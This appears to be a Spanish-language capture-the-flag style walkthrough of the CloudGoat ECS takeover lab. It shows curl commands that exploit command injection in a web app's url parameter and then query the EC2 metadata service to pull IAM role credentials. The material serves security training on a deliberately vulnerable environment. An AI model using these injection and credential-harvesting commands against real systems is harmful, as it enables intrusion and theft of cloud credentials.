---
description: 'Lab: CloudGoat'
---

# ECS\_takeover

## Laboratorio

En este escenario se empieza realizando un pentesting de caja negra contra un aplicativo web alojado en una instancia EC2. Luego de identificar una vulnerabilidad que permite RCE sobre el aplicativo web se abusará del servicio de metadatos de la instancia y del docker. Para posteriormente, comprometer una de las tareas que está corriendo en un cluster al que se tiene acceso por medio de la instancia comprometida.

{% hint style="danger" %}
El desarrollo de este ejercicio puede llegar a consumir recursos económicos dentro de las cuentas de AWS.
{% endhint %}

{% embed url="https://github.com/RhinoSecurityLabs/cloudgoat/tree/master/scenarios/ecs_takeover" %}

<mark style="color:green;">**Objetivo**</mark>: Obtenga acceso al contenedor "bóveda" y recupere la bandera.

### Configuración inicial

Checar instalación de CloudGoad en:

{% content-ref url="./" %}
[.](./)
{% endcontent-ref %}

Lanzar el escenario con:

```bash
./cloudgoat.py create ecs_takeover
```

<figure><img src="../../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

### Explotación

Al finalizar la preparación del laboratorio se arroja un sito web: [http://ec2-54-236-32-165.compute-1.amazonaws.com/](http://ec2-54-236-32-165.compute-1.amazonaws.com/) el cual contiene un aplicativo como el siguiente:

<figure><img src="../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

Luego de ingresar una URL válida como www.google.com se identificó que se puede agregar un parámetro URL sobre el enlace original, y además se ve como el aplicativo web incrusta el código HTML sobre el DOM de la página.

<figure><img src="../../../.gitbook/assets/image (85).png" alt=""><figcaption></figcaption></figure>

Realizando una inyección de parámetros se observó que el aplicativo responde comandos de sistema operativo:

{% code overflow="wrap" %}
```
curl "http://ec2-54-236-32-165.compute-1.amazonaws.com/?url=%3Bls+-l"
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

Haciendo uso de la vulnerabilidad de code injection se puede observar que el aplicativo está corriendo bajo el usuario de root:

{% code overflow="wrap" %}
```
curl "http://ec2-54-236-32-165.compute-1.amazonaws.com/?url=%3Bwhoami"
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (71).png" alt=""><figcaption></figcaption></figure>

Usando el comando env podemos listas las variables de entorno del sito:

<figure><img src="../../../.gitbook/assets/image (84).png" alt=""><figcaption></figcaption></figure>

Listando las interfaces de red existentes se encontró una interfaz de red docker, lo cual indica el uso de contenedores

```
curl "http://ec2-54-236-32-165.compute-1.amazonaws.com/?url=%3Bip+a+show"
```

<figure><img src="../../../.gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>

Listando los contenedores con `docker ps -a` se encontraron los siguientes contenedores:

<figure><img src="../../../.gitbook/assets/image (6) (2).png" alt=""><figcaption></figcaption></figure>

| Contenedor                                                                                 | ID           |
| ------------------------------------------------------------------------------------------ | ------------ |
| ecs-cg-ecs-takeover-ecs\_takeover\_cgidjozev9f9bv-vulnsite-1-vulnsite-bcf8beafe588ccca8a01 | 7bfa57af37b6 |
| ecs-cg-ecs-takeover-ecs\_takeover\_cgidjozev9f9bv-privd-1-privd-a2bfc681b6dcf9d55500       | 64ca7db98975 |
| ecs-agent                                                                                  | aaead8b98f5f |

Se puede generar una rever shell en el sitio y tener mayores capacidades, para fines didácticos solo se va a consumir los metadatos del rol de la instancias ec2 y se procedesa a usar las credenciales de acceso

{% code overflow="wrap" %}
```
curl "http://ec2-54-236-32-165.compute-1.amazonaws.com/?url=%3Bcurl+http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```
curl "http://ec2-54-236-32-165.compute-1.amazonaws.com/?url=%3Bcurl+http://169.254.169.254/latest/meta-data/iam/security-credentials/cg-ecs-takeover-ecs_takeover_cgidjozev9f9bv-ecs-agent"
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>







